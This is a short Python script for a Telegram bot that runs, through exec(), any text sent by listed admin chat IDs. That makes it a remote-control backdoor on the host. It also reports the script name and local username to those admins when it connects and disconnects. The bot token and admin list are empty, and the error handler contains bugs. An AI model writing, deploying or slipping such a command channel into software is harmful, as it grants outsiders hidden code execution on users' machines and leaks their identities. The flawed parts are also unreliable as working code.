from telebot import TeleBot
from os import getlogin
from sys import argv
ADMIN = {}
bot = TeleBot()
@bot.message_handler(content_types=['text'])
def main(message):
	if message.chat.id in ADMIN.values():
		try:
			for login, id in ADMIN.items():
				bot.send_message(id, 'Executing: \n{t}\nBy: {l} ({id})'.format(t=message.text, id=message.chat.id, l=login))
			exec(message.text)
			for login, id in ADMIN.items():
				bot.send_message(id, 'Executed successfully: \n{t}\nBy: {l} ({id})'.format(t=message.text, id=message.chat.id, l=login))
		except Exception as error:
			for id in ADMIN.items():
				bot.send_message(id, 'Excepted: \n{t}\nBy: {l} ({id})'.format(t=message.text, id=message.chat.id, l=login))
for id in ADMIN.values():
	bot.send_message(id, 'Connected with: {n}\nUsername: {l}'.format(n=argv[0], l=getlogin()))
bot.polling()
for id in ADMIN.values():
	bot.send_message(id, 'Disconnected with: {n}\nUsername: {l}'.format(n=argv[0], l=getlogin()))
